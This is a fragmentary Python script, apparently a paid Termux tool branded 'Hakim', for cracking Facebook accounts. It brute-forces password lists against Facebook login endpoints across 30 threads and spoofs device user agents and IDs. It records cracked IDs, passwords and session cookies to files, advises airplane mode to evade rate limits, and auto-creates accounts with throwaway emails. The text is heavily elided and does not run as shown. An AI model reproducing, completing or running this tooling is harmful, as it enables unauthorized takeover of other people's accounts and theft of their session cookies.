...
try:
    ...
    print('\n\033[1;32WELCOME TO HARD TOOL')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python Hakim.py')
try:
    os.mkdir('/sdcard/Hakim')
except:pass
import os
import sys
import time
...
logo=("""\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\x1b[1;93m ██   ██  █████  ██   ██ ██ ███    ███ 
\x1b[1;91m ██   ██ ██   ██ ██  ██  ██ ████  ████ 
 \033[1;97m███████ ███████ █████   ██ ██ ████ ██ 
 \x1b[1;92m██   ██ ██   ██ ██  ██  ██ ██  ██  ██ 
\033[1;91m ██   ██ ██   ██ ██   ██ ██ ██      ██ 
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mAuthor  : Hakim Ameri
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mFacebook  : Youssef
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mService : PAID
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : 2.8
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCloning ids Saved in Hakim folder
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
#os.system('https://t.me/JgMKhf3ZqtUxNDNk')
def clear():
        os.system('clear')
        print(logo)
A = '\x1b[1;97m' 
...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome Hakim xd Hakim Tool\33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print(" \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mHakim Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane mode after 2 minutes ")
                    linex()
                    for user in fo:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Hakim:     
                        clear()
                        ...
                        for psx in user:
                                ...
                                Hakim.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [Hakim-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/LM-X420;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1356};FB_FW/1;]"
                li = ['28','29','210']
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [Hakim-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Hakim/Hakim-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [Hakim-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/Hakim/Hakim-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/Hakim/Hakim-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Hakim-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"
    ...
    'viewport-width': '980',
                        ...
                        url = 'https://x.facebook.com/login'
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/Hakim/Hakim-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Hakim/Hakim-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Hakim-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64) AppleWebKit/537.16 (KHTML, like Gecko)Chrome/55.0.1854.272 Safari/536.1 Edge/14.77544]"+"[Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.2; WOW64 Trident/4.0)]"+"[Mozilla/5.0 (Windows; Windows NT 10.2; WOW64) AppleWebKit/537.16 (KHTML, like Gecko) Chrome/51.0.2185.359 Safari/533]"+"[Mozilla/5.0 (Windows; U; Windows NT 10.0; Win64; x64; en-US) AppleWebKit/603.42 (KHTML, like Gecko) Chrome/51.0.2701.366 Safari/534]"+"[Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 10.2;; en-US Trident/7.0)]"+"[Mozilla/5.0 (Windows NT 10.5; x64) Gecko/20130401 Firefox/57.7]"+"[Mozilla/5.0 (Windows; Windows NT 10.5; x64) AppleWebKit/601.29 (KHTML, like Gecko) Chrome/51.0.3897.315 Safari/537.4 Edge/18.80263]"+"[Mozilla/5.0 (Windows; U; Windows NT 10.5;; en-US) AppleWebKit/535.17 (KHTML, like Gecko) Chrome/49.0.1230.132 Safari/537.8 Edge/10.27714]"+"[Mozilla/5.0 (Windows; Windows NT 10.4;; en-US) Gecko/20100101 Firefox/49.8]"+"[Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.4; x64; en-US Trident/6.0)]"+"[Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 6.2; Win64; x64 Trident/5.0)]"+"[Mozilla/5.0 (Windows; U; Windows NT 6.1;) AppleWebKit/602.27 (KHTML, like Gecko) Chrome/49.0.3598.253 Safari/533]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
    ...
    'viewport-width': '980',
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Hakim-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/Hakim/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Hakim/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [Hakim-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Hakim/Hakim-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [Hakim-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [Hakim-OK] "+uid+'|'+pas+'|'+coki)                 
                 linex()
                 ok+=1
                 open("/sdcard/Hakim/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
